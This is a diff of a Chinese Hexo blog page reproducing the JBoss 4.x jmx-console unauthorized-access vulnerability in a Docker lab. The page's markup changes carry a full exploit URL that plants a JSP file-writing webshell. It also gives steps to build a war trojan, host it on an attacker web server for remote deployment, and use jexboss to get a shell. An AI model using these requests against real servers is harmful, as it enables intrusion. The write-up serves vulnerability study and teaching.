@@ -31,7 +31,7 @@
     <script src="/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Taoing's Blog" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 
@@ -393,14 +393,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    823
+                    880
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    4 分
                 </div>
                 
 
@@ -414,6 +414,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -430,45 +433,34 @@
 <p>一键安装Docker<br>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：<br>curl -s <a target="_blank" rel="noopener" href="https://get.docker.com/">https://get.docker.com/</a> | sh </p>
 </blockquote>
 <p>1、搜索漏洞环境：</p>
-<pre><code>sudo docker search testjboss
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker search testjboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5759958140263.png"><br>2、拉取镜像：</p>
-<pre><code>sudo docker pull testjboss/jboss
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker pull testjboss&#x2F;jboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3844100168689.png"><br>3、查看现有的docker环境</p>
-<pre><code>sudo docker images
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1123202156556.png"><br>4、运行环境，访问<a target="_blank" rel="noopener" href="http://ip即可/">http://ip即可</a></p>
-<pre><code>sudo docker run -p 80:8080 -d testjboss/jboss
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker run -p 80:8080 -d testjboss&#x2F;jboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <hr>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h3><h4 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1:"></a>Method 1:</h4><p><a target="_blank" rel="noopener" href="http://your/">http://Your</a> IP/jmx-console  直接访问jboss控制台</p>
-<pre><code>http://Your IP/jmx-console//HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&amp;argType=boolean&amp;arg4=True
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;&#x2F;HtmlAdaptor?action&#x3D;invokeOpByName&amp;name&#x3D;jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName&#x3D;store&amp;argType&#x3D;java.lang.String&amp;arg0&#x3D;August.war&amp;argType&#x3D;java.lang.String&amp;&amp;arg1&#x3D;shell&amp;argType&#x3D;java.lang.String&amp;arg2&#x3D;.jsp&amp;argType&#x3D;java.lang.String&amp;arg3&#x3D;%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&amp;argType&#x3D;boolean&amp;arg4&#x3D;True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>url中的参数：arg0代表war包的名称，arg1=文件名称，arg2=文件后缀名，arg3=文件内容<br>url解码为：</p>
-<pre><code>http://Your IP/jmx-console//HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin:service=DeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=&lt;%+if(request.getParameter(&quot;f&quot;)!=null)(new+java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());+%&gt;&amp;argType=boolean&amp;arg4=True
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;&#x2F;HtmlAdaptor?action&#x3D;invokeOpByName&amp;name&#x3D;jboss.admin:service&#x3D;DeploymentFileRepository&amp;methodName&#x3D;store&amp;argType&#x3D;java.lang.String&amp;arg0&#x3D;August.war&amp;argType&#x3D;java.lang.String&amp;&amp;arg1&#x3D;shell&amp;argType&#x3D;java.lang.String&amp;arg2&#x3D;.jsp&amp;argType&#x3D;java.lang.String&amp;arg3&#x3D;&lt;%+if(request.getParameter(&quot;f&quot;)!&#x3D;null)(new+java.io.FileOutputStream(application.getRealPath(&quot;&#x2F;&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());+%&gt;&amp;argType&#x3D;boolean&amp;arg4&#x3D;True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>功能是写入文件，f=文件名，t=文件内容</strong></p>
 <p>写入hack.txt文件</p>
-<pre><code>http://Your IP/August/shell.jsp?f=hack.txt&amp;t=Are you script boy
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;August&#x2F;shell.jsp?f&#x3D;hack.txt&amp;t&#x3D;Are you script boy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5198123176722.png"><br>访问hack.txt文件<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/758824169391.png"></p>
 <hr>
 <h4 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2:"></a>Method 2:</h4><p>首先制作一个war木马（需要jdk），在jsp小马目录下cmd执行：</p>
-<pre><code>jar cvf shell.war test.jsp
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">jar cvf shell.war test.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3179648165946.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/911249179580.png"><br>若报拒绝访问错误，请使用管理员权限运行cmd<br><strong>将war包放在自己的WEB服务器上</strong></p>
-<pre><code> python3 -m http.server 777    #使用python起临时web服务 端口为777
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 777    #使用python起临时web服务 端口为777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/4961950174686.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/4532151155927.png" alt="\\"></p>
 <hr>
 <p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1174650177184.png"><br>然后找到jboss.deployment（jboss 自带的部署功能）中的flavor=URL,type=DeploymentScanner点进去（通过 url 的方式远程部署）<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1104253178367.png"><br> 也可以直接输入URL进入：</p>
-<pre><code>http://Your IP/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deployment:type=DeploymentScanner,flavor=URL
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;HtmlAdaptor?action&#x3D;inspectMBean&amp;name&#x3D;jboss.deployment:type&#x3D;DeploymentScanner,flavor&#x3D;URL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="vx_images/4759354173503.png"><br>找到页面中的void addURL()选项来远程加载war包来部署。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5814456160183.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3690404160713.png"><br>查看部署是否成功<br>返回到刚进入jmx-console的页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的war包即可</p>
 <h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具:"></a>检测工具:</h3><p>检测工具：jexboss，一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。<br>使用：</p>
-<pre><code>python jexboss.py -u http://ip:port
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python jexboss.py -u http:&#x2F;&#x2F;ip:port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2538330172164.png"></p>
 
                 
@@ -589,13 +581,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/07/05/JBOSS%20CVE-2017-12149%E5%A4%8D%E7%8E%B0/">
+                <a href="/2021/07/05/Jboss%20CVE-2017-7504/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="JBOSS CVE-2017-12149">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Jboss CVE-2017-7504">
                         
-                        <span class="card-title">JBOSS CVE-2017-12149</span>
+                        <span class="card-title">Jboss CVE-2017-7504</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -627,8 +619,8 @@
                         <span class="chip bg-color">JBOSS</span>
                     </a>
                     
-                    <a href="/tags/CVE-2017-12149/">
-                        <span class="chip bg-color">CVE-2017-12149</span>
+                    <a href="/tags/CVE-2017-7504/">
+                        <span class="chip bg-color">CVE-2017-7504</span>
                     </a>
                     
                 </div>
@@ -793,7 +785,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">3.5k</span>
+                        class="white-color">3.6k</span>
             
             
             
